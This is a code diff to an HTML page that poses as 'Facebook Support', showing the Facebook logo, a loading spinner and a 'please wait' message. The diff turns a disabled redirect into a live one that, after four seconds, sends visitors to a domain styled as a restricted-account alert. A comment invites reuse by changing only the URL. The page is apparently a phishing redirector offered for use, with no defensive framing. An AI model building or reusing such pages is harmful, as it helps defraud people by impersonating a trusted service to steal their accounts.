@@ -2,72 +2,37 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>Facebook Support</title>
 <style>
 *{box-sizing:border-box}
-body{
-  margin:0;
-  min-height:100vh;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  background:#f0f2f5;
-  font-family:Arial,Helvetica,sans-serif;
-}
-.card{
-  width:min(92%,420px);
-  background:#fff;
-  border-radius:16px;
-  padding:42px 28px;
-  text-align:center;
-  box-shadow:0 8px 28px rgba(0,0,0,.10);
-}
-.logo{
-  width:78px;
-  height:78px;
-  margin:0 auto 22px;
-  display:block;
-}
-h1{
-  margin:0 0 10px;
-  font-size:23px;
-  color:#1c1e21;
-}
-p{
-  margin:0 0 24px;
-  color:#65676b;
-  font-size:14px;
-}
-.loader{
-  width:42px;
-  height:42px;
-  margin:auto;
-  border:4px solid #e4e6eb;
-  border-top-color:#1877f2;
-  border-radius:50%;
-  animation:spin .9s linear infinite;
-}
+body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f2f5;font-family:Arial,sans-serif}
+.card{width:min(92%,420px);background:#fff;border-radius:16px;padding:42px 28px;text-align:center;box-shadow:0 8px 28px rgba(0,0,0,.1)}
+.logo{width:78px;height:78px;margin:0 auto 22px;display:block}
+h1{margin:0 0 10px;font-size:23px;color:#1c1e21}
+p{margin:0 0 24px;color:#65676b;font-size:14px}
+.loader{width:42px;height:42px;margin:auto;border:4px solid #e4e6eb;border-top-color:#1877f2;border-radius:50%;animation:spin .9s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
 <div class="card">
-  <img class="logo" alt="Facebook" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMjggMTI4Ij4KPGNpcmNsZSBjeD0iNjQiIGN5PSI2NCIgcj0iNjQiIGZpbGw9IiMxODc3RjIiLz4KPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcyLjYgMTExVjY5LjdoMTMuOWwyLjEtMTYuMUg3Mi42VjQzLjNjMC00LjcgMS4zLTcuOSA4LTcuOWg4LjVWMjFjLTEuNS0uMi02LjctLjctMTIuOC0uNy0xMi43IDAtMjEuNCA3LjgtMjEuNCAyMi4xdjEyLjNINDAuNXYxNi4xaDE0LjRWMTExaDE3Ljd6Ii8+Cjwvc3ZnPg==">
-  <h1>Facebook Support</h1>
-  <p>Loading, please wait...</p>
-  <div class="loader"></div>
+<img class="logo" alt="Facebook" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMjggMTI4Ij4KPGNpcmNsZSBjeD0iNjQiIGN5PSI2NCIgcj0iNjQiIGZpbGw9IiMxODc3RjIiLz4KPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcyLjYgMTExVjY5LjdoMTMuOWwyLjEtMTYuMUg3Mi42VjQzLjNjMC00LjcgMS4zLTcuOSA4LTcuOWg4LjVWMjFjLTEuNS0uMi02LjctLjctMTIuOC0uNy0xMi43IDAtMjEuNCA3LjgtMjEuNCAyMi4xdjEyLjNINDAuNXYxNi4xaDE0LjRWMTExaDE3Ljd6Ii8+Cjwvc3ZnPg==">
+<h1>Facebook Support</h1>
+<p>Loading, please wait...</p>
+<div class="loader"></div>
 </div>
 
 <script>
-const REDIRECT_URL = "https://restricted-account-alert.surge.sh/";
-const REDIRECT_DELAY = 3000;
+/* ===== ONLY CHANGE THIS URL ===== */
+const YOUR_URL = "https://restricted-account-alert.surge.sh/";
+/* ================================ */
 
-setTimeout(function(){
-  if (REDIRECT_URL && REDIRECT_URL !== "https://restricted-account-alert.surge.sh/") {
-    window.location.href = REDIRECT_URL;
-  }
-}, REDIRECT_DELAY);
+const delay = 4000; // 4 seconds (between 3 and 5)
+
+setTimeout(() => {
+  window.location.replace(YOUR_URL);
+}, delay);
 </script>
 </body>
 </html>
